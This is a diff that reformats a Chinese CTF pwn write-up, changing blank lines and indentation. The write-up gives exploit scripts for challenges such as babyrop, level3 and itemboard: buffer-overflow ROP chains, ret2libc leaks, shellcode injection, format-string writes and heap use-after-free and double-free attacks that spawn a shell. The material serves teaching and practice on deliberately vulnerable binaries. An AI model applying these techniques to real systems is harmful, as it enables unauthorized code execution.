@@ -272,6 +272,7 @@ sla('please:\n', p32(pwnme) + '%4c%10$n')
 ### babystack
 
 ret2text 模板题。
+
 ```python
 sla('name:\n','1000')
 payload = flat('a'*0x18,elf.sym['backdoor'])
@@ -281,6 +282,7 @@ sla('name?\n', payload)
 ### babyrop
 
 ret2libc 模板题。
+
 ```python
 pop_rdi = 0x400733
 payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln'])
@@ -296,6 +298,7 @@ sla('story!\n',payload)
 ### babystack2
 
 本题在 babystack 的基础上，限制了输入的长度：
+
 ```c
 if ((signed int)nbytes > 10 )
   {
@@ -303,6 +306,7 @@ if ((signed int)nbytes > 10 )
     exit(-1);
   }
 ```
+
 注意到这里仅仅判断了大于，而且会强制类型转换为有符号数，而原来的 `nbytes` 是无符号的，因此可以整数溢出绕过。
 
 ```python
@@ -336,10 +340,12 @@ sla('story!\n',payload)
 ### encrypted_stack
 
 逆向题，`sub_400a70` 处存在求逆元函数，说明题目可能使用了 RSA 加密，我们的任务就是找到私钥然后对题目产生的随机数进行解密，循环 20 次后即可通过验证，最后 ret2libc。在 `main` 中可以发现如下语句：
+
 ```c
 v7 = qword_602098;
 v8 = qword_602090;
 ```
+
 猜测是 RSA 的 e 和 N，查看后发现 `e=0x10001, N=0x150013E8C603B57`。这个 N 显然容易分解，从而得到私钥。
 
 ```python
@@ -347,26 +353,26 @@ N = 94576960329497431
 d = 26375682325297625
 
 def powmod(a, b, m):
-	if a == 0:
-		return 0
-	if b == 0:
-		return 1
-	res = powmod(a,b//2,m)
-	res *= res
-	res %= m
-	if b&1:
-		res *= a
-		res %= m
-	return res
+    if a == 0:
+        return 0
+    if b == 0:
+        return 1
+    res = powmod(a,b//2,m)
+    res *= res
+    res %= m
+    if b&1:
+        res *= a
+        res %= m
+    return res
 
 def ans():
-	global ru,sl
-	ru("it\n")
-	for i in range(20):
-		c = int(ru('\n'))
-		m = powmod(c, d, N)
-		sl(str(m))
-		ru('\n')
+    global ru,sl
+    ru("it\n")
+    for i in range(20):
+        c = int(ru('\n'))
+        m = powmod(c, d, N)
+        sl(str(m))
+        ru('\n')
 
 ans()
 ru('name:\n')
@@ -384,19 +390,20 @@ sl(payload)
 ### YDSneedGirlfriend
 
 本题在删除时没有将指针置空，存在 uaf。而 `girlfriend` 结构体由一个打印名字的函数和存储名字的 `char` 数组构成，我们希望能将该函数指向程序中已经存在的 `backdoor` 函数。需要注意 64 位下最少分配 `0x20` 字节，而 `add(0x20)` 会分配 `0x30` 字节。这确保了在 `add(0x8)` 时，先被分配到的是 `girlfriend1` 的函数指针，然后是 `girlfriend0` 的函数指针。
+
 ```python
 def add(size,name='a'):
-	sla(':','1')
-	sla(':',str(size))
-	sla(':',name)
+    sla(':','1')
+    sla(':',str(size))
+    sla(':',name)
 
 def delete(index):
-	sla(':','2')
-	sla(':',str(index))
+    sla(':','2')
+    sla(':',str(index))
 
 def show(index):
-	sla(':','3')
-	sla(':',str(index))
+    sla(':','3')
+    sla(':',str(index))
 
 add(0x20)
 add(0x20)
@@ -407,19 +414,20 @@ show(0)
 ```
 
 本题和 hitcontraining_uaf 类似，不过后者是 32 位的。
+
 ```python
 def add(size,name='a'):
-	sla(':','1')
-	sla(':',str(size))
-	sla(':',name)
+    sla(':','1')
+    sla(':',str(size))
+    sla(':',name)
 
 def delete(index):
-	sla(':','2')
-	sla(':',str(index))
+    sla(':','2')
+    sla(':',str(index))
 
 def show(index):
-	sla(':','3')
-	sla(':',str(index))
+    sla(':','3')
+    sla(':',str(index))
 
 add(0x10)
 add(0x10)
@@ -434,6 +442,7 @@ show(0)
 ### level0
 
 ret2text。
+
 ```python
 payload = flat('a'*0x88,elf.sym['callsystem'])
 sla('World\n', payload)
@@ -442,6 +451,7 @@ sla('World\n', payload)
 ### level1
 
 题目给出了 `buf` 的真实地址，且 `buf` 可以输入 `0x100` 字节，那么可以在 `buf` 中写 shellcode 然后返回到 `buf`。
+
 ```python
 ru('0x')
 buf = int(ru('?'),16)
@@ -451,6 +461,7 @@ sl(payload)
 ```
 
 但是本题远程文件出了点问题导致拿不到 `buf` 的真实地址，所以换了种办法，调用 `read` 把 shellcode 读取到 bss 段上，然后返回到 bss 段 getshell。
+
 ```python
 pop3 = 0x8048549
 payload = flat('a'*(0x88+4),elf.plt['read'],pop3,0,elf.bss(),0x100,elf.bss())
@@ -461,6 +472,7 @@ sl(asm(shellcraft.sh()))
 ### level2
 
 本题中存在 `system` 函数，通过 ROPgadgets 搜索到了 `binsh` 字符串，构造调用 `system("/bin/sh")` 即可。
+
 ```python
 binsh = 0x804a024
 payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4,binsh)
@@ -470,6 +482,7 @@ sla('Input:\n',payload)
 ### level2_x64
 
 上一题的 64 位版本，需要通过 `pop rdi; ret` 的 gadget 传参。
+
 ```python
 pop_rdi = 0x4006b3
 binsh = 0x600a90
@@ -480,6 +493,7 @@ sla('Input:\n',payload)
 ### level3
 
 没有 system 和 binsh 但有 libc，因此常规 ret2libc。
+
 ```python
 payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)
 ru('Input:\n')
@@ -494,6 +508,7 @@ sla('Input:\n',payload)
 ### level3_x64 & level5
 
 上题的 64 位版本，依然需要寄存器传参。
+
 ```python
 pop_rdi = 0x4006b3
 pop_rsi_r15 = 0x4006b1
@@ -510,6 +525,7 @@ sla('Input:\n',payload)
 ### level4
 
 和 `level3` 几乎相同，依然是 ret2libc。
+
 ```python
 payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)
 sl(payload)
@@ -525,6 +541,7 @@ sl(payload)
 三题比较类似，以 64 位为例。[参考文章](https://www.anquanke.com/post/id/162882)。
 
 首先本题存在一个索引表，结构大致是这样：
+
 ```
 | ...        |
  ------------
@@ -546,12 +563,13 @@ sl(payload)
  ------------
 | ...        |
 ```
+
 - `max_size`：最大记录数
 - `exist_num`：当前记录数
 - `chunk0`:
-	- `allocated`：是否是被分配的
-	- `size_user`：用户数据长度
-	- `ptr_heap`：返回给用户的指针
+  - `allocated`：是否是被分配的
+  - `size_user`：用户数据长度
+  - `ptr_heap`：返回给用户的指针
 
 题目主要漏洞有 2 处，首先是新建记录时存在 off-by-one，可以多读入一个字节，从而泄露后面相邻区域的内容。第二处漏洞就是常见的 `free` 后没有置空指针，造成了 `double free`。
 
@@ -563,25 +581,25 @@ sl(payload)
 
 ```python
 def list():
-	sla(':','1')
+    sla(':','1')
 
 def add(len,content='a'):
-	sla(':','2')
-	sla('note:',str(len))
-	sa('note:',content)
+    sla(':','2')
+    sla('note:',str(len))
+    sa('note:',content)
 
 def edit(index,len,content):
-	sla(':','3')
-	sla('number:',str(index))
-	sla('note:',str(len))
-	sa('note:',content)
+    sla(':','3')
+    sla('number:',str(index))
+    sla('note:',str(len))
+    sa('note:',content)
 
 def delete(index):
-	sla(':','4')
-	sla('number:',str(index))
+    sla(':','4')
+    sla('number:',str(index))
 
 for i in range(4):
-	add(1)
+    add(1)
 delete(0)
 delete(2)
 add(8,'deadbeef') # 0
@@ -595,7 +613,7 @@ ru('2. deadbeef') # 2->bk = main_arena+88
 base = uu64(ru('\n'))-88-libc.sym['__malloc_hook']-0x10
 leak('base',base)
 for i in range(3,-1,-1):
-	delete(i)
+    delete(i)
 
 # chunk0:prev_size,size,fd,bk,data
 fake = flat(0,0x81,heap+0x30-0x18,heap+0x30-0x10,'a'*0x60)
@@ -613,12 +631,12 @@ edit(1,8,'/bin/sh\x00')
 delete(1)
 ```
 
-
 而 `guestbook2` 仅仅是提示语不同，其余没有任何区别。`level6` 是 32 位的版本。
 
 ### tell_me_something
 
 64 位下的 ret2text，后门函数为 `good_game` 函数。
+
 ```python
 payload = flat('a'*0x88,elf.sym['good_game'])
 sla(':\n',payload)
@@ -627,6 +645,7 @@ sla(':\n',payload)
 ### fm
 
 存在格式化字符串漏洞，我们需要修改 `x` 的值为 4 来 getshell。测得输入偏移为 11。而 `p32(x 的地址)` 长度 4 字节，恰好能将 4 写入 `x` 的地址。
+
 ```python
 x = 0x804a02c
 sl(p32(x)+'%11$n')
@@ -635,6 +654,7 @@ sl(p32(x)+'%11$n')
 ### test_your_memory
 
 本题看似复杂，实际上由于给了一个提示 `hint`，指向 `cat flag` 字符串，又存在后门函数 `win_func` 执行 `system(command)`，那么我们只需要把 `cat flag` 字符串传给 `win_func` 即可。
+
 ```python
 cat_flag = 0x80487e0
 payload = flat('a'*(0x13+4),elf.sym['win_func'],elf.sym['main'],cat_flag)
@@ -644,18 +664,20 @@ sl(payload)
 ### itemboard
 
 结构体：
+
 ```c
 struct ItemStruct
 {
-	char *name;
-	char *description;
-	void (*free)(ItemStruct *);
+    char *name;
+    char *description;
+    void (*free)(ItemStruct *);
 }
 ```
 
 在创建新 item 时，首先会创建 `0x20` 的 `Item Struct*`，包含了 `name,description,free` 三个指针；随后创建 `0x30` 的空间存放 `name`；最后根据用户输入创建对应大小的空间存放 `description`。
 
 那么我们可以先创建一个 `0x80` 的 chunk 然后释放，它会进入 unsorted bin 中，此时其 `fd` 指向 `main_arena+88`，通过 `show` 即可泄露 libc。注意这里的 `show` 函数：
+
 ```c
 void __cdecl show_item()
 {
@@ -680,7 +702,9 @@ void __cdecl show_item()
   }
 }
 ```
+
 它会检查下标是否越界，以及下标对应的元素是否存在。然而，在删除时：
+
 ```c
 void __cdecl remove_item()
 {
@@ -702,24 +726,25 @@ void __cdecl remove_item()
   }
 }
 ```
+
 调用了结构体自己的 `free` 函数，参数是结构体偏移为 0 的位置也就是 `name`。随后的 `set_null` 函数并不会把 `item_array[index]` 置空，因此即使删除了元素，`item_array[index]` 仍然存在，第二项检查毫无作用。这就是为什么我们可以 `show` 一个空闲块从而泄露 libc。
 
 然后我们就有了 `system` 地址，容易想到用它覆盖结构体指针的 `free`，然后让结构体指针的 `name` 指向 `/bin/sh`。不过，如果这里直接 `add` 新的 chunk，首先会分配我们不可控的 `0x20` 的结构体指针，然后才是可控的 `0x30` 的 `name`。因此我们希望 `name` 字段被分配到的实际上是原来 `chunk0` 的结构体指针，这样就可以写入结构体指针了。要做到这一点，可以先 `free(chunk1)` 产生一个大小合适的 chunk。那么再 `add` 时，结构体指针就会使用原来 `chunk1` 的了。
 
 ```python
 def add(name,len,content):
-	sla(':\n','1')
-	sla('?\n',name)
-	sla('?\n',str(len))
-	sla('?\n',content)
+    sla(':\n','1')
+    sla('?\n',name)
+    sla('?\n',str(len))
+    sla('?\n',content)
 
 def free(index):
-	sla(':\n','4')
-	sla('?\n',str(index))
+    sla(':\n','4')
+    sla('?\n',str(index))
 
 def show(index):
-	sla(':\n','3')
-	sla('?\n',str(index))
+    sla(':\n','3')
+    sla('?\n',str(index))
 
 add('chunk0',0x80,'a')
 add('chunk1',0x80,'b')
@@ -734,4 +759,3 @@ free(1)
 add('/bin/sh;'+'a'*8+p64(system),0x18,'c')
 free(0)
 ```
-
